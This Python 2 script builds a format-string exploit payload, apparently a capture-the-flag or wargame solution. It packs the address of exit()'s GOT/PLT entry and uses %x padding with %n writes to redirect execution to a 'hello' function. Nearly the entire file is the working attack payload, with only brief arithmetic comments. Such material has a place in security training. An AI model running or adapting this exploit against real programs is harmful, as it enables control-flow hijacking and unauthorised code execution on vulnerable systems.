import struct

HELLO = 0x80484fd
EXIT_PLT = 0x804a020

def pad(s):
	return s + "X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_PLT)   # convert lower integer address to binary str
exploit += struct.pack("I", EXIT_PLT+2) # convert higher address
exploit += "BBBBCCCC"
exploit += "%4$34029x"   # 0x84fd - (0x2e - 30)
exploit += "%4$n"
exploit += "%33543x"    # 0x10804 - 0x851b + 30
exploit += "%5$n"

print pad(exploit)
